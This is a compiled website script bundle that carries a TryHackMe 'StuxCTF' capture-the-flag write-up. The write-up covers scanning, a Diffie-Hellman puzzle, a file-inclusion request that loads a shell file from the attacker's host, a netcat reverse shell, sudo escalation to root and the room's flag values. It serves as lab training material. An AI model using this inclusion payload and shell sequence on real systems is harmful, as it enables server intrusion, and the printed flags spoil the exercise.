"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9337],{3905:(t,e,n)=>{n.d(e,{Zo:()=>c,kt:()=>h});var r=n(67294);function a(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function o(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)}return n}function l(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?o(Object(n),!0).forEach((function(e){a(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function i(t,e){if(null==t)return{};var n,r,a=function(t,e){if(null==t)return{};var n,r,a={},o=Object.keys(t);for(r=0;r<o.length;r++)n=o[r],e.indexOf(n)>=0||(a[n]=t[n]);return a}(t,e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(t);for(r=0;r<o.length;r++)n=o[r],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(t,n)&&(a[n]=t[n])}return a}var s=r.createContext({}),p=function(t){var e=r.useContext(s),n=e;return t&&(n="function"==typeof t?t(e):l(l({},e),t)),n},c=function(t){var e=p(t.components);return r.createElement(s.Provider,{value:e},t.children)},u="mdxType",d={inlineCode:"code",wrapper:function(t){var e=t.children;return r.createElement(r.Fragment,{},e)}},m=r.forwardRef((function(t,e){var n=t.components,a=t.mdxType,o=t.originalType,s=t.parentName,c=i(t,["components","mdxType","originalType","parentName"]),u=p(n),m=a,h=u["".concat(s,".").concat(m)]||u[m]||d[m]||o;return n?r.createElement(h,l(l({ref:e},c),{},{components:n})):r.createElement(h,l({ref:e},c))}));function h(t,e){var n=arguments,a=e&&e.mdxType;if("string"==typeof t||a){var o=n.length,l=new Array(o);l[0]=m;var i={};for(var s in e)hasOwnProperty.call(e,s)&&(i[s]=e[s]);i.originalType=t,i[u]="string"==typeof t?t:a,l[1]=i;for(var p=2;p<o;p++)l[p]=n[p];return r.createElement.apply(null,l)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},10723:(t,e,n)=>{n.r(e),n.d(e,{assets:()=>s,contentTitle:()=>l,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var r=n(87462),a=(n(67294),n(3905));const o={},l="StuxCTF",i={unversionedId:"Tryhackme/StuxCTF/StuxCTF",id:"Tryhackme/StuxCTF/StuxCTF",title:"StuxCTF",description:"Crypto, serealization, priv scalation and more ...!",source:"@site/writeups/Tryhackme/StuxCTF/StuxCTF.md",sourceDirName:"Tryhackme/StuxCTF",slug:"/Tryhackme/StuxCTF/",permalink:"/writeups/Tryhackme/StuxCTF/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Steel Mountain",permalink:"/writeups/Tryhackme/Steel Mountain/"},next:{title:"Sublist3r",permalink:"/writeups/Tryhackme/Sublist3r/"}},s={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 StuxCTF",id:"task-1-stuxctf",level:2}],c={toc:p},u="wrapper";function d(t){let{components:e,...n}=t;return(0,a.kt)(u,(0,r.Z)({},c,n,{components:e,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"stuxctf"},"StuxCTF"),(0,a.kt)("p",null,"Crypto, serealization, priv scalation and more ...!"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/stuxctf"},"StuxCTF")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Cryptography",(0,a.kt)("ul",{parentName:"li"},(0,a.kt)("li",{parentName:"ul"},"AES"))),(0,a.kt)("li",{parentName:"ul"},"Local File Inclusion"),(0,a.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-stuxctf"},"Task 1 StuxCTF"),(0,a.kt)("p",null,"Read user.txt and root.txt"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/StuxCTF$ sudo nmap -A -sS -sC -sV -O 10.10.66.221\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 16:43 CEST\nNmap scan report for 10.10.66.221\nHost is up (0.037s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 e8:da:b7:0d:a7:a1:cc:8e:ac:4b:19:6d:25:2b:3e:77 (RSA)\n|   256 c1:0c:5a:db:6c:d6:a3:15:96:85:21:e9:48:65:28:42 (ECDSA)\n|_  256 0f:1a:6a:d1:bb:cb:a6:3e:bd:8f:99:8d:da:2f:30:86 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry\n|_/StuxCTF/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Default Page\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/13%OT=22%CT=1%CU=41085%PV=Y%DS=2%DC=T%G=Y%TM=5F85BD\nOS:37%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 554/tcp)\nHOP RTT      ADDRESS\n1   36.03 ms 10.8.0.1\n2   36.33 ms 10.10.66.221\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.30 seconds\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.66.221/robots.txt"},"http://10.10.66.221/robots.txt")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"# robots.txt generated by StuxCTF\n# Diffie-Hellman\nUser-agent: *\nDisallow:\nDisallow: /StuxCTF/\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.66.221/StuxCTF/"},"http://10.10.66.221/StuxCTF/")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.66.221/"},"view-source:http://10.10.66.221/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"<html>\n    <head>\n        <title>Default Page</title>\n    </head>\n    <body>\n        \x3c!-- The secret directory is...\n        p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;\n        g: 7;\n        a: 330;\n        b: 450;\n        g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;\n        --\x3e\n        is blank....\n    </body>\n</html>\n")),(0,a.kt)("p",null,"p: ",(0,a.kt)("inlineCode",{parentName:"p"},"9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251"),";\ng: ",(0,a.kt)("inlineCode",{parentName:"p"},"7"),";\na: ",(0,a.kt)("inlineCode",{parentName:"p"},"330"),";\nb: ",(0,a.kt)("inlineCode",{parentName:"p"},"450"),";\ng^c: ",(0,a.kt)("inlineCode",{parentName:"p"},"6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617"),";"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.66.221/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/"},"http://10.10.66.221/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n    <head>\n        <title>StuxCTF</title>\n    <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1">\n        <link rel="stylesheet" href="assets/css/bootstrap.min.css" />\n        <link rel="stylesheet" href="assets/css/style.css" />\n    </head>\n        <body>\n        <nav class="navbar navbar-default navbar-fixed-top">\n          <div class="container">\n            <div class="navbar-header">\n              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">\n                <span class="sr-only">Toggle navigation</span>\n              </button>\n              <a class="navbar-brand" href="index.php">Home</a>\n            </div>\n          </div>\n        </nav>\n        \x3c!-- hint: /?file= --\x3e\n        <div class="container">\n            <div class="jumbotron">\n                <center>\n                    <h1>Follow the white rabbit..</h1>\n                </center>\n            </div>\n        </div>\n        <script src="assets/js/jquery-1.11.3.min.js"><\/script>\n        <script src="assets/js/bootstrap.min.js"><\/script>\n    </body>\n</html>\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/?file=http://10.8.106.222:80/shell.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/n.php")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/StuxCTF$ nc -lnvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.66.221] 35024\nwhoami\nwww-data\npwd\n/var/www/html/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055\ncd /home\nls\ngrecia\ncd grecia\nls\nuser.txt\ncat user.txt\n0b6044b7807dd100b9e30f1bd09db53f\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"sudo -l\nMatching Defaults entries for www-data on ubuntu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on ubuntu:\n    (ALL) NOPASSWD: ALL\nsudo su\nwhoami\nroot\ncd /root\nls\nroot.txt\ncat root.txt\n0028454003b42601548df551b738976c\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"user.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"0b6044b7807dd100b9e30f1bd09db53f")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"root.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"0028454003b42601548df551b738976c")),(0,a.kt)("ol",{start:3},(0,a.kt)("li",{parentName:"ol"},"What is the hidden directory? HINT: ",(0,a.kt)("inlineCode",{parentName:"li"},"g ^ a mod p, g ^ b mod p, g ^ C mod p")," first 128 characters ...")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055")))}d.isMDXComponent=!0}}]);